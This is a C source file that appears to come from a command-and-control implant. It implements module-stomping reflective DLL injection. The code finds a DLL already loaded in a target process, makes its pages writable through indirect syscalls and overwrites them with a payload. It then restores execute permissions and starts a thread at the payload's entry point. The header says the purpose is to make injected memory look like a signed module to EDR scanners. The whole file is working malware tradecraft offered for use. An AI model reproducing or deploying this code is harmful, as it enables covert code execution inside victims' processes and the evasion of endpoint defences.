/*!
 * ARC-05: Module-stomping reflective loader
 *
 * Implements DllInjectModuleStomp — an alternative injection path that writes
 * the payload into an existing, file-backed DLL mapping in the target process
 * rather than allocating new anonymous MEM_PRIVATE pages.  The resulting memory
 * region is typed MEM_IMAGE by the memory manager, so it appears as a signed
 * on-disk module to EDR memory scanners instead of a suspicious RWX allocation.
 *
 * Technique overview:
 *   1. Select a "victim" DLL that is already mapped in the target process:
 *        a. If Config.Inject.StompDll is set, use that module name.
 *        b. Otherwise walk InLoadOrderModuleList and pick the first module
 *           whose SizeOfImage >= payload size that is not ntdll/kernel32.
 *   2. Verify the victim's base address in the target process is MEM_IMAGE
 *      (guards against edge cases where ASLR bases diverge between processes).
 *   3. Change the victim's page protection to PAGE_READWRITE via indirect
 *      NtProtectVirtualMemory (DX_MEM_SYSCALL).
 *   4. Overwrite the victim's mapping with the payload bytes.
 *   5. Restore PAGE_EXECUTE_READ on the written region.
 *   6. Start a thread at the payload's entry point inside the stomped region.
 *
 * IMPORTANT: Windows uses per-boot, process-shared ASLR for system DLLs, so
 * a DLL's load address is the same in every process during one boot session.
 * We find the victim in the local PEB (cheap), then write to that same address
 * in the target process.
 */

#include <Demon.h>
#include <ntstatus.h>

#include <core/Win32.h>
#include <core/Command.h>
#include <core/Package.h>
#include <core/MiniStd.h>
#include <core/Memory.h>
#include <core/Thread.h>
#include <inject/Inject.h>
#include <inject/InjectUtil.h>
#include <inject/Stomp.h>
#include <common/Macros.h>
#include <common/Defines.h>

/* MEM_IMAGE type flag used in MEMORY_BASIC_INFORMATION.Type */
#ifndef MEM_IMAGE
#define MEM_IMAGE 0x1000000
#endif

/*!
 * Walk the local process PEB InLoadOrderModuleList to find a victim DLL.
 *
 * If Config.Inject.StompDll is non-NULL the search is by (case-insensitive)
 * name and NULL is returned if that module is not found or is too small.
 * Otherwise the first module that is not ntdll/kernel32 and has
 * SizeOfImage >= RequiredSize is returned.
 *
 * @param RequiredSize      Minimum SizeOfImage the victim must satisfy.
 * @param pVictimImageSize  Receives the victim's SizeOfImage on success.
 * @return                  DllBase of the victim module, or NULL on failure.
 */
static PVOID StompFindVictim(
    IN  SIZE_T  RequiredSize,
    OUT PULONG  pVictimImageSize
) {
    PLDR_DATA_TABLE_ENTRY Ldr        = NULL;
    PLIST_ENTRY           Hdr        = NULL;
    PLIST_ENTRY           Ent        = NULL;
    PVOID                 Result     = NULL;
    PIMAGE_NT_HEADERS     NtHdrs     = NULL;
    LPWSTR                TargetName = NULL;
    BOOL                  UseDefault = FALSE;
    INT                   NameLen    = 0;
    INT                   TgtLen     = 0;

    if ( ! pVictimImageSize ) {
        return NULL;
    }

    *pVictimImageSize = 0;

    /* Module name configured by the operator (may be NULL) */
    TargetName = Instance->Config.Inject.StompDll;
    UseDefault = ( TargetName == NULL );

    /* Ensure the TEB pointer is initialised */
    if ( ! Instance->Teb ) {
        Instance->Teb = NtCurrentTeb();
    }

    Hdr = & Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList;
    Ent = Hdr->Flink;

    for ( ; Hdr != Ent ; Ent = Ent->Flink ) {
        Ldr = C_PTR( Ent );

        /* Skip entries with no name or base */
        if ( ! Ldr->DllBase || ! Ldr->BaseDllName.Buffer ||
             Ldr->BaseDllName.Length == 0 ) {
            continue;
        }

        if ( ! UseDefault ) {
            /* Operator-configured victim: match by case-insensitive name */
            NameLen = (INT)( Ldr->BaseDllName.Length / sizeof( WCHAR ) );
            TgtLen  = (INT) StringLengthW( TargetName );

            if ( NameLen != TgtLen ) {
                continue;
            }

            if ( StringNCompareIW( Ldr->BaseDllName.Buffer, TargetName,
                                   NameLen ) == 0 ) {
                /* Name matches — check SizeOfImage */
                NtHdrs = RVA( PIMAGE_NT_HEADERS, Ldr->DllBase,
                              ( (PIMAGE_DOS_HEADER) Ldr->DllBase )->e_lfanew );
                if ( NtHdrs->OptionalHeader.SizeOfImage >= RequiredSize ) {
                    *pVictimImageSize = NtHdrs->OptionalHeader.SizeOfImage;
                    Result = Ldr->DllBase;
                }
                /* Stop regardless — the operator asked for this specific DLL */
                break;
            }
        } else {
            /* Auto-select: skip ntdll.dll and kernel32.dll */
            DWORD ModHash = HashEx( Ldr->BaseDllName.Buffer,
                                    Ldr->BaseDllName.Length, TRUE );
            if ( ModHash == H_MODULE_NTDLL || ModHash == H_MODULE_KERNEL32 ) {
                continue;
            }

            /* Check SizeOfImage satisfies the requirement */
            NtHdrs = RVA( PIMAGE_NT_HEADERS, Ldr->DllBase,
                          ( (PIMAGE_DOS_HEADER) Ldr->DllBase )->e_lfanew );
            if ( NtHdrs->OptionalHeader.SizeOfImage >= RequiredSize ) {
                *pVictimImageSize = NtHdrs->OptionalHeader.SizeOfImage;
                Result = Ldr->DllBase;
                break;
            }
        }
    }

    return Result;
}

/*!
 * Inject a DLL into hTargetProcess by stomping an existing mapped module.
 *
 * See module header for full technique description.
 */
DWORD DllInjectModuleStomp(
    IN HANDLE         hTargetProcess,
    IN LPVOID         DllLdr,
    IN DWORD          DllLdrSize,
    IN LPVOID         DllBuffer,
    IN DWORD          DllLength,
    IN PVOID          Parameter,
    IN SIZE_T         ParamSize,
    IN PINJECTION_CTX ctx
) {
    DWORD                   ReturnValue         = INJECT_ERROR_FAILED;
    NTSTATUS                NtStatus            = STATUS_SUCCESS;
    DWORD                   ReflectiveLdrOffset = 0;
    LPVOID                  FullDll             = NULL;
    ULONG                   FullDllSize         = 0;
    BOOL                    HasRDll             = FALSE;
    PVOID                   VictimBase          = NULL;
    ULONG                   VictimImageSize     = 0;
    PVOID                   MemParams           = NULL;
    PVOID                   ExecEntry           = NULL;
    SIZE_T                  WriteSize           = 0;
    BOOL                    x64                 = FALSE;
    MEMORY_BASIC_INFORMATION Mbi                = { 0 };

    PRINTF( "[STOMP] DllInjectModuleStomp( hProcess=%p DllLen=%u )\n",
            hTargetProcess, DllLength )

    if ( ! DllBuffer || ! DllLength || ! hTargetProcess ) {
        PUTS( "[STOMP] invalid params" )
        return INJECT_ERROR_INVALID_PARAM;
    }

    /* Determine target architecture */
    x64 = ( Instance->Session.OS_Arch != PROCESSOR_ARCHITECTURE_INTEL );

    if ( ProcessIsWow( hTargetProcess ) ) {
        x64 = FALSE;
        if ( GetPeArch( DllBuffer ) != PROCESS_ARCH_X86 ) {
            PUTS( "[STOMP] arch mismatch: x64 payload into x86 process" )
            return ERROR_INJECT_PROC_PAYLOAD_ARCH_DONT_MATCH_X64_TO_X86;
        }
    } else {
        if ( GetPeArch( DllBuffer ) != PROCESS_ARCH_X64 ) {
            PUTS( "[STOMP] arch mismatch: x86 payload into x64 process" )
            return ERROR_INJECT_PROC_PAYLOAD_ARCH_DONT_MATCH_X86_TO_X64;
        }
    }

    /* Decide whether to prepend KaynLdr or use the embedded reflective loader */
    if ( ( ReflectiveLdrOffset = GetReflectiveLoaderOffset( DllBuffer ) ) ) {
        PUTS( "[STOMP] DLL has embedded reflective loader" )
        HasRDll     = TRUE;
        FullDll     = DllBuffer;
        FullDllSize = DllLength;
    } else {
        PUTS( "[STOMP] prepending KaynLdr stub" )
        HasRDll     = FALSE;
        FullDllSize = DllLdrSize + DllLength;
        FullDll     = Instance->Win32.LocalAlloc( LPTR, FullDllSize );
        if ( ! FullDll ) {
            PUTS( "[STOMP] LocalAlloc for FullDll failed" )
            return INJECT_ERROR_FAILED;
        }
        MemCopy( FullDll, DllLdr, DllLdrSize );
        MemCopy( C_PTR( U_PTR( FullDll ) + DllLdrSize ), DllBuffer, DllLength );
    }

    PRINTF( "[STOMP] FullDllSize=%lu ReflectiveLdrOffset=%lu\n",
            FullDllSize, ReflectiveLdrOffset )

    /* -----------------------------------------------------------------------
     * 1. Select victim DLL from the local PEB (same VA in target via
     *    per-boot shared ASLR for system DLLs).
     * -------------------------------------------------------------------- */
    VictimBase = StompFindVictim( (SIZE_T) FullDllSize, &VictimImageSize );
    if ( ! VictimBase ) {
        PUTS( "[STOMP] no suitable victim DLL found — check StompDll config" )
        ReturnValue = INJECT_ERROR_FAILED;
        goto Cleanup;
    }

    PRINTF( "[STOMP] victim base=%p imageSize=%lu\n", VictimBase, VictimImageSize )

    /* -----------------------------------------------------------------------
     * 2. Verify the victim address in the target process is MEM_IMAGE.
     *    This guards against the (rare) case where a DLL was unloaded in
     *    the target after we found it in our own PEB, or ASLR divergence.
     * -------------------------------------------------------------------- */
    NtStatus = SysNtQueryVirtualMemory(
        hTargetProcess,
        VictimBase,
        MemoryBasicInformation,
        &Mbi,
        sizeof( Mbi ),
        NULL
    );
    if ( ! NT_SUCCESS( NtStatus ) ) {
        PRINTF( "[STOMP] NtQueryVirtualMemory failed: %x\n", NtStatus )
        ReturnValue = INJECT_ERROR_FAILED;
        goto Cleanup;
    }
    if ( Mbi.Type != MEM_IMAGE ) {
        PUTS( "[STOMP] victim region in target is not MEM_IMAGE — aborting" )
        ReturnValue = INJECT_ERROR_FAILED;
        goto Cleanup;
    }

    /* -----------------------------------------------------------------------
     * 3. Write optional argument buffer into the target process.
     *    This is a small separate allocation — acceptable because it is not
     *    executable and its size is negligible compared to the stomped region.
     * -------------------------------------------------------------------- */
    if ( Parameter && ParamSize > 0 ) {
        MemParams = MmVirtualAlloc( DX_MEM_SYSCALL, hTargetProcess,
                                    ParamSize, PAGE_READWRITE );
        if ( ! MemParams ) {
            PUTS( "[STOMP] failed to allocate param memory in target" )
            ReturnValue = INJECT_ERROR_FAILED;
            goto Cleanup;
        }
        if ( ! MmVirtualWrite( hTargetProcess, MemParams, Parameter, ParamSize ) ) {
            PUTS( "[STOMP] NtWriteVirtualMemory for params failed" )
            ReturnValue = INJECT_ERROR_FAILED;
            goto Cleanup;
        }
        ctx->Parameter = MemParams;
        PRINTF( "[STOMP] params written to %p (%lu bytes)\n",
                MemParams, (ULONG) ParamSize )
    }

    /* -----------------------------------------------------------------------
     * 4. Make the victim DLL's pages writable in the target process so the
     *    payload can be written.  Only the region we need is changed.
     * -------------------------------------------------------------------- */
    WriteSize = (SIZE_T) FullDllSize;

    if ( ! MmVirtualProtect( DX_MEM_SYSCALL, hTargetProcess,
                             VictimBase, WriteSize, PAGE_READWRITE ) ) {
        PUTS( "[STOMP] NtProtectVirtualMemory RW failed on victim" )
        ReturnValue = INJECT_ERROR_FAILED;
        goto Cleanup;
    }

    /* -----------------------------------------------------------------------
     * 5. Write the payload bytes over the victim module's mapping.
     * -------------------------------------------------------------------- */
    if ( ! MmVirtualWrite( hTargetProcess, VictimBase, FullDll, FullDllSize ) ) {
        PUTS( "[STOMP] NtWriteVirtualMemory into victim failed" )
        /* Best-effort: restore RX so the target process does not crash */
        MmVirtualProtect( DX_MEM_SYSCALL, hTargetProcess,
                          VictimBase, WriteSize, PAGE_EXECUTE_READ );
        ReturnValue = INJECT_ERROR_FAILED;
        goto Cleanup;
    }

    /* -----------------------------------------------------------------------
     * 6. Restore PAGE_EXECUTE_READ on the written region.
     * -------------------------------------------------------------------- */
    if ( ! MmVirtualProtect( DX_MEM_SYSCALL, hTargetProcess,
                             VictimBase, WriteSize, PAGE_EXECUTE_READ ) ) {
        PUTS( "[STOMP] NtProtectVirtualMemory RX restore failed" )
        ReturnValue = INJECT_ERROR_FAILED;
        goto Cleanup;
    }

    /* -----------------------------------------------------------------------
     * 7. Start a thread in the target at the payload entry point.
     *    For a DLL with an embedded reflective loader the offset points
     *    to ReflectiveLoader().  For a KaynLdr-prepended payload the
     *    reflective offset is 0 (start of the stub).
     * -------------------------------------------------------------------- */
    ExecEntry = C_PTR( U_PTR( VictimBase ) + ReflectiveLdrOffset );

    PRINTF( "[STOMP] ExecEntry=%p (base=%p + offset=%lu)\n",
            ExecEntry, VictimBase, ReflectiveLdrOffset )

    if ( ! ThreadCreate( THREAD_METHOD_NTCREATEHREADEX, hTargetProcess,
                         x64, ExecEntry, MemParams, NULL ) ) {
        PRINTF( "[STOMP] ThreadCreate failed: %lu\n", NtGetLastError() )
        PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
        ReturnValue = INJECT_ERROR_FAILED;
        goto Cleanup;
    }

    ReturnValue = 0;
    PUTS( "[STOMP] module-stomp injection complete" )

Cleanup:
    if ( ! HasRDll && FullDll ) {
        MemSet( FullDll, 0, FullDllSize );
        Instance->Win32.LocalFree( FullDll );
        FullDll = NULL;
    }

    return ReturnValue;
}
